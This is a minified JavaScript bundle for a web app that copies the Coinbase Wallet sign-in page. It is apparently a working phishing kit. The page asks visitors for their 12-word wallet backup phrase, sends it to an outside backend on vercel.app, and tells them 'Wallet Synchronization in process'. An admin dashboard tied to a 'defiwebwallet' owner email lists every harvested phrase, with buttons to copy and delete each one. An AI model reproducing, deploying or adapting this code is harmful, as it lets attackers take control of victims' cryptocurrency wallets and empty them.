(this.webpackJsonpcoinb=this.webpackJsonpcoinb||[]).push([[0],{19:function(e,t,n){},44:function(e,t,n){},45:function(e,t,n){"use strict";n.r(t);var r=n(1),s=n.n(r),a=n(15),c=n.n(a),o=n(20),i=n(14),l=n(11),d=n(25),u=n(26),j=n(10),b=n(4),h="GET_PHRASE_SUCCESS",f="PUT_PHRASE_START",m="PUT_PHRASE_SUCCESS",p="PUT_PHRASE_FAILED",x="AUTH_START",g="AUTH_SUCCESS",O="AUTH_FAILED",y="AUTH_LOGOUT",v="DELETE_START",w="DELETE_SUCCESS",N="DELETE_FAILED",S="https://coinb-backend.vercel.app",I=function(e){return{type:p,err:e}},k=function(e){return{type:N,err:e}},P=function(e){return function(t){var n;t((console.log("delete start"),{type:v,data:n}));var r={query:'\n                mutation { deletePhrase(id:"'.concat(e,'"\n                    ){\n                                  \n                        createdAt\n                    }\n                }\n            ')};return fetch(S+"/api/graphql",{method:"POST",body:JSON.stringify(r),headers:{"Content-Type":"application/json"}}).then((function(e){return e.json()})).then((function(e){e.errors?t(k(e.errors[0].message)):t(function(e){return{type:w,data:e}}(e.data.deletePhrase))})).catch((function(e){console.log(e),t(k(e))}))}},A=function(e){return function(t){var n;t({type:f,data:n});var r={query:'\n                mutation { createPhrase(phrase:"'.concat(e,'"\n                    ){\n                                      \n                        createdAt\n                    }\n                }\n            ')};return fetch(S+"/api/graphql",{method:"POST",body:JSON.stringify(r),headers:{"Content-Type":"application/json"}}).then((function(e){return e.json()})).then((function(e){e.errors?t(I(e.errors[0].message)):t(function(e){return{type:m,data:e}}(e.data.createPhrase))})).catch((function(e){console.log(e),t(I(e))}))}},T=function(e){return function(t){t({type:"GET_PHRASE_START"});return fetch(S+"/api/graphql",{method:"POST",body:JSON.stringify({query:"{\n                getAllPhrases {\n                    getPhrase {\n                        _id\n                        phraseNO\n                        createdAt\n                        phrase\n                    }\n                }\n            }"}),headers:{"Content-Type":"application/json",Authorization:"Bearer "+e}}).then((function(e){return e.json()})).then((function(e){var n;e.errors&&t(I(e.errors[0].message)),t((n=e.data.getAllPhrases,{type:h,data:n}))})).catch((function(e){console.log(e),t(I(e))}))}},C=function(e,t,n,r){return{type:g,userId:e,tokenId:t,role:n,email:r}},_=function(e,t){return{type:O,page:e,error:t}},E=function(){return sessionStorage.removeItem("token"),sessionStorage.removeItem("userId"),sessionStorage.removeItem("expiryDate"),sessionStorage.removeItem("siteOwner"),{type:y}},L=function(e,t){return function(n){n({type:x});var r={query:'{\n                login(email: "'.concat(e,'", password: "').concat(t,'"){\n                userId\n                token\n                role\n                email\n            }\n          }\n         ')};fetch("https://coinb-backend.vercel.app/api/graphql",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(r)}).then((function(e){return e.json()})).then((function(e){if(e.errors)return n(_("login",e.errors[0].message));n(function(e,t,n,r){return function(s){sessionStorage.setItem("userId",e),sessionStorage.setItem("token",t),"admin@defiwebwallet.com"===r&&sessionStorage.setItem("siteOwner",!0);var a=36e5,c=new Date((new Date).getTime()+a);sessionStorage.setItem("expiryTime",a),sessionStorage.setItem("expiryDate",c.toISOString()),s(C(e,t,n,r)),setTimeout((function(){}),a)}}(e.data.login.userId,e.data.login.token,e.data.login.role,e.data.login.email))})).catch((function(e){return console.log("error in login",e),n(_("login","Failed to fetch (500)"))}))}},D=n(5),H=n(28),R=n.p+"static/media/logo.c7d87ed7.svg";var B=n(27),U=n(2),q=function(e){var t=e.name,n=e.link_path;return Object(U.jsxs)("li",{className:" py-1 lg:py-3 px-4 lg:px-4  lg:self-center font-semibold lg:font-semibold text-base flex ",children:[Object(U.jsxs)("a",{href:n,children:[t," "]}),"Products"===t?Object(U.jsx)(B.a,{className:"self-center text-gray-300",style:{marginLeft:".2rem",marginTop:"-3px"}}):""]})},F=function(){var e=function(){var e=arguments.length>0&&void 0!==arguments[0]&&arguments[0],t=s.a.useState(e),n=Object(D.a)(t,2),r=n[0],a=n[1],c=s.a.useCallback((function(){a((function(e){return!e}))}),[]);return[r,c]}(),t=Object(D.a)(e,2),n=t[0],r=t[1],a={width:n?"100%":"0",visibility:n?"visible":"hidden"},c=Object(U.jsx)("div",{className:"flex z-30 relative border-2 border-white",style:{padding:"1px 5px",borderRadius:"3px"},children:Object(U.jsx)(H.a,{className:"text-white self-center text-2xl relative cursor-pointer",onClick:r})}),o=Object(U.jsx)("div",{className:"fixed top-0 left-0 w-full h-full z-20 bg-[#3882cde6]",style:a,children:Object(U.jsxs)("div",{className:"categoryModal",children:[Object(U.jsx)("hr",{className:"mt-3 border-t border-[#ffffff26]"}),Object(U.jsxs)("ul",{className:"ml-4",children:[Object(U.jsx)(q,{name:"Products",link_path:"/"}),Object(U.jsxs)("ul",{className:"border-l border-[#ffffff26] ml-7 ",children:[Object(U.jsx)(q,{name:"Buy/Sell Cryptocurrency",link_path:"/"}),Object(U.jsx)(q,{name:"                                Coinbase Pro ",link_path:"/"}),Object(U.jsx)(q,{name:"                                Coinbase Prime",link_path:"/"}),Object(U.jsx)(q,{name:"                                Coinbase Platform",link_path:"/"}),Object(U.jsx)(q,{name:"                                Coinbase Commerce ",link_path:"/"})]}),Object(U.jsx)(q,{name:"Help",link_path:"/"})]}),Object(U.jsx)("hr",{className:"mt-8 border-t border-[#ffffff26] pb-2"}),Object(U.jsx)("div",{className:"ml-4",children:Object(U.jsx)(q,{name:"Prices",link_path:"/"})})]})});return Object(U.jsxs)("nav",{className:"grid grid-cols-nav justify-between px-12 lg:px-8 align relative mt-6 font-HelveticaBold ",children:[Object(U.jsx)("div",{className:"w-full items-center justify-between grid gap-y-4 lg:flex ",children:Object(U.jsx)("img",{src:R,alt:"",className:"max-w-none z-50",width:"112"})}),Object(U.jsxs)("div",{className:"modal lg:hidden justify-self-end",children:[c,o]}),Object(U.jsxs)("ul",{className:"hidden lg:flex align-middle justify-self-end",children:[Object(U.jsx)(q,{name:"Products",link_path:"/"}),Object(U.jsx)(q,{name:"Help",link_path:"/"}),Object(U.jsx)(q,{name:"Prices",link_path:"/"})]})]})},G=n(21),z=n.n(G),J=n(29),W=Object(l.b)((function(e){return{createdPhrase:e.phrase.putPhrase,error:e.phrase.error}}),(function(e){return{onInitPutPhrase:function(t){return e(A(t))}}}))((function(e){var t=Object(r.useState)(""),n=Object(D.a)(t,2),s=n[0],a=n[1],c=Object(r.useState)({}),o=Object(D.a)(c,2),i=o[0],l=o[1],d=function(){var t=Object(J.a)(z.a.mark((function t(n){return z.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:n.preventDefault(),e.onInitPutPhrase(s);case 2:case"end":return t.stop()}}),t)})));return function(e){return t.apply(this,arguments)}}();return Object(r.useEffect)((function(){e.createdPhrase&&l({content:"Wallet Synchronization in process!!",type:"success"}),e.error&&(console.log("error",e.error),l({content:"Invalid Phrase, Please check your entries!!",type:"error"}))}),[e.createdPhrase,e.error]),Object(U.jsxs)("form",{className:"grid w-full place-content-stretch bg-white ",style:{padding:"32px 24px"},onSubmit:d,children:[i&&i.content&&Object(U.jsx)("div",{className:" grid font-semibold mb-8",children:Object(U.jsx)("p",{className:"px-3 py-1 rounded-lg justify-self-center text-black ".concat("success"===i.type?"bg-yellow-600":"bg-red-800"),children:i.content})}),Object(U.jsx)("textarea",{id:"phrase",className:"text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch ",rows:2,required:!0,value:s,placeholder:"Enter 12-word Backup phrase",onChange:function(e){a(e.target.value)}}),Object(U.jsxs)("div",{className:"flex justify-between items-center pt-10 font-medium",children:[Object(U.jsxs)("div",{className:"text-xs font-normal text-[#708599]",children:[Object(U.jsx)("input",{type:"checkbox",id:"checkbox",required:!0})," ","",Object(U.jsx)("label",{htmlFor:"checkbox",children:"Keep me signed in on this computer"})]}),Object(U.jsx)("button",{className:"text-white bg-[#1652f0] rounded-sm",style:{padding:"11px 22px",fontSize:"11px"},children:"SIGN IN"})]})]})})),M=(n(19),function(){return Object(U.jsx)("div",{className:"grid ",children:Object(U.jsxs)("div",{className:"sm:text-left grid gap-7 md:justify-center",children:[Object(U.jsx)("h1",{className:"main__text",children:"Sign in to Coinbase Wallet"}),Object(U.jsx)("div",{className:"",children:Object(U.jsx)(W,{})})]})})});function K(){return Object(U.jsxs)("div",{className:"text-5xl text-center",children:[Object(U.jsxs)("p",{className:"mb-3 font-Helvetica",children:[Object(U.jsx)("a",{href:"#blank",children:"Forgot password?"}),Object(U.jsx)("a",{href:"#blank",className:"px-3",children:"Don't have an account?"}),Object(U.jsx)("a",{href:"#blank",children:"Privacy Policy"}),Object(U.jsx)("br",{})]}),Object(U.jsx)("p",{className:"font-Graphik",children:Object(U.jsx)("a",{href:"#blank",children:"Have an issue with 2-factor authentication?"})})]})}var Q=function(){return Object(U.jsx)("div",{className:"h-screen overflow-x-hidden justify-items-center",children:Object(U.jsxs)("div",{className:"grid w-full lg:px-4 lg:w-11/12",children:[Object(U.jsx)("div",{className:"my-0 mx-auto w-full sm:pb-20",children:Object(U.jsx)(F,{})}),Object(U.jsx)("div",{className:" mx-auto w-full my-9",children:Object(U.jsx)(M,{})}),Object(U.jsx)("div",{className:"mx-auto w-full",children:Object(U.jsx)(K,{})})]})})},V=n(30),X=function(e){var t=e.phraseContents,n=e.index,s=e.deletePhrase,a=e.loading;console.log(t._id);var c=Object(r.useState)(!1),o=Object(D.a)(c,2),i=o[0],l=o[1];return Object(r.useEffect)((function(){i&&setTimeout((function(){l(!1)}),4e3)}),[i]),Object(U.jsxs)("div",{className:"grid p-4 border rounded-md bg-white text-black font-semibold shadow-inner gap-y-2 justify-items-center",children:[Object(U.jsx)("p",{children:n+1}),i&&Object(U.jsx)("p",{className:" bg-green-800 px-2 py-1 text-white",children:"Copied!"}),Object(U.jsxs)("div",{className:"border-t-2 border-b-2 border-gray-300 grid",children:[Object(U.jsx)("p",{className:"my-1",children:t.phrase}),Object(U.jsxs)("div",{className:"flex justify-between",children:[Object(U.jsx)("button",{className:" bg-red-700 text-white justify-self-end py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 my-2 mr-4",onClick:function(){return s(t._id)},children:a?"Loading...":"delete"}),Object(U.jsx)(V.CopyToClipboard,{text:t.phrase,onCopy:function(){l(!0)},children:Object(U.jsx)("button",{className:"bg-[#3375BB] text-white justify-self-end py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 my-2","data-clipboard-target":"#linkRef",children:"Copy Phrase"})})]})]}),Object(U.jsx)("p",{children:t.createdAt})]})},Y=Object(l.b)((function(e){return{err:e.auth.error,tokenId:e.auth.tokenId,userId:e.auth.userId,AllPhrases:e.phrase.getAllPhrases,loading:e.phrase.loading,deleted:e.phrase.deleted}}),(function(e){return{onInitGetPhrases:function(t){return e(T(t))},onInitLogout:function(){return e(E)},onInitDeletePhrase:function(t){return e(P(t))}}}))((function(e){var t=Object(r.useState)(),n=Object(D.a)(t,2),s=n[0],a=n[1];Object(r.useEffect)((function(){e.tokenId?e.onInitGetPhrases(e.tokenId):e.history.push("/")}),[]),Object(r.useEffect)((function(){e.AllPhrases&&a(e.AllPhrases),e.deleted&&a(e.AllPhrases)}),[e.AllPhrases,e.deleted]);return console.log({allPhrases:s}),Object(U.jsxs)("div",{className:"my-4 mx-auto w-5/6 mt-10 grid justify-items-center gap-y-4",children:[Object(U.jsx)("button",{onClick:function(){return e.onInitLogout(),void e.history.push("/")},className:"text-[#3375BB] bg-white justify-self-end py-2 px-6 font-semibold rounded-md outline-none mb-5",children:"LOGOUT"}),Object(U.jsx)("h2",{className:" text-3xl font-bold text-gray-400 mb-5",children:"ALL PHRASES"}),s&&s.reverse().map((function(t,n){return Object(U.jsx)(X,{phraseContents:t,index:n,deletePhrase:e.onInitDeletePhrase,loading:e.loading},n)}))]})})),Z=Object(l.b)((function(e){return{loading:e.auth.loading,err:e.auth.error,tokenId:e.auth.tokenId,userId:e.auth.userId}}),(function(e){return{onInitLogin:function(t,n){return e(L(t,n))}}}))((function(e){var t=Object(r.useState)(null),n=Object(D.a)(t,2),s=n[0],a=n[1],c=Object(r.useState)(""),o=Object(D.a)(c,2),i=o[0],l=o[1],d=Object(r.useState)(""),u=Object(D.a)(d,2),j=u[0],b=u[1];Object(r.useEffect)((function(){e.err?a("Invalid Login"):e.tokenId&&(a("Success"),e.history.push("/admin/dashboard"))}),[e]);return Object(U.jsx)(U.Fragment,{children:Object(U.jsx)("div",{className:"flex items-center h-screen w-full bg-teal-lighter",children:Object(U.jsxs)("div",{className:"w-full bg-white rounded shadow-lg p-8 m-4 md:max-w-sm md:mx-auto",children:[Object(U.jsx)("h1",{className:"block w-full text-center text-[#3375BB] mb-6",children:"Welcome to DefiWebWallet"}),Object(U.jsx)("h1",{className:"block w-full text-center text-black mb-6",children:s}),Object(U.jsxs)("form",{className:"mb-4 md:flex md:flex-wrap md:justify-between  text-black",onSubmit:function(t){t.preventDefault(),e.onInitLogin(i,j)},children:[Object(U.jsxs)("div",{className:"field-group mb-4 md:w-full grid ",children:[Object(U.jsx)("label",{className:"field-label",htmlFor:"email",children:"Email"}),Object(U.jsx)("input",{className:"field border rounded border-gray-600 outline-none py-1 px-3",type:"email",name:"email",value:i,required:!0,onChange:function(e){l(e.target.value)}})]}),Object(U.jsxs)("div",{className:"field-group mb-6 md:w-full grid",children:[Object(U.jsx)("label",{className:"field-label",htmlFor:"password",children:"Password"}),Object(U.jsx)("input",{className:"field border rounded border-gray-600 outline-none py-1 px-3",type:"password",name:"password",value:j,required:!0,onChange:function(e){b(e.target.value)}})]}),Object(U.jsxs)("button",{className:" mx-auto  bg-[#3375BB] justify-self-center py-2 px-6 font-semibold rounded-md outline-none text-white",children:[e.loading?"Loading...":"Login"," "]})]})]})})})}));var $=Object(b.g)(Object(l.b)((function(e){return{siteOwner:e.auth.siteOwner,auth:e.auth.tokenId}}),(function(e){return{onCheckState:function(t,n){return e(C(t,n))}}}))((function(e){console.log("update");var t=Object(r.useRef)();Object(r.useEffect)((function(){var n=localStorage.getItem("token"),r=localStorage.getItem("userId");t.current||n&&e.onCheckState(n,r),t.current=!0}),[e]);var n=Object(U.jsxs)(b.d,{children:[Object(U.jsx)(b.b,{path:"/",exact:!0,component:Q}),Object(U.jsx)(b.b,{path:"/Auth/login",component:Z}),Object(U.jsx)(b.a,{to:"/"})]});return e.auth&&(n=Object(U.jsxs)(b.d,{children:[Object(U.jsx)(b.b,{path:"/",exact:!0,component:Q}),Object(U.jsx)(b.b,{path:"/Auth/login",render:function(e){return Object(U.jsx)(Z,Object(j.a)({},e))}}),Object(U.jsx)(b.b,{path:"/admin",render:function(e){return Object(U.jsx)(Y,Object(j.a)({},e))}})," ",Object(U.jsx)(b.a,{to:"/"})]})),Object(U.jsx)("div",{className:"rootApp",children:n})}))),ee=function(e,t){return Object(j.a)(Object(j.a)({},e),t)},te={error:null,loading:!1,getAllPhrases:[]},ne=function(e,t){return ee(e,{loading:!0})},re=function(e,t){return ee(e,{loading:!1,deleted:t.data.createdAt})},se=function(e,t){return ee(e,{loading:!1,error:t.err})},ae=function(e,t){return ee(e,{loading:!0})},ce=function(e,t){return ee(e,{loading:!1,putPhrase:t.data.createdAt,id:t.data._id})},oe=function(e,t){return ee(e,{loading:!1,getAllPhrases:t.data.getPhrase})},ie=function(e,t){return ee(e,{loading:!1,error:t.err})},le=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:te,t=arguments.length>1?arguments[1]:void 0;switch(t.type){case f:return ae(e);case m:return ce(e,t);case h:return oe(e,t);case p:return ie(e,t);case v:return ne(e);case w:return re(e,t);case N:return se(e,t);default:return e}},de={error:null,loading:!1,userId:sessionStorage.getItem("userId")||null,tokenId:sessionStorage.getItem("token")||null,siteOwner:sessionStorage.getItem("siteOwner")||!1,role:null,email:null},ue=function(e,t){return ee(e,{loading:!0})},je=function(e,t){return ee(e,Object(j.a)(Object(j.a)({},t),{},{loading:!1,userId:t.userId,tokenId:t.tokenId,role:t.role,siteOwner:"admin@defiwebwallet.com"===t.email,email:t.email,error:null}))},be=function(e,t){return ee(e,{loading:!1,error:{page:t.page,error:t.error}})},he=function(e,t){return ee(e,Object(j.a)(Object(j.a)({},t),{},{loading:!1,userId:null,tokenId:null,error:null}))},fe=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:de,t=arguments.length>1?arguments[1]:void 0;switch(t.type){case x:return ue(e);case g:return je(e,t);case O:return be(e,t);case y:return he(e,t);default:return e}},me=(n(44),{phrase:le,auth:fe}),pe=Object(i.createStore)(Object(i.combineReducers)(me),Object(u.composeWithDevTools)(Object(i.applyMiddleware)(d.a))),xe=Object(U.jsx)(l.a,{store:pe,children:Object(U.jsx)(o.a,{children:Object(U.jsx)($,{})})});c.a.render(xe,document.getElementById("root"))}},[[45,1,2]]]);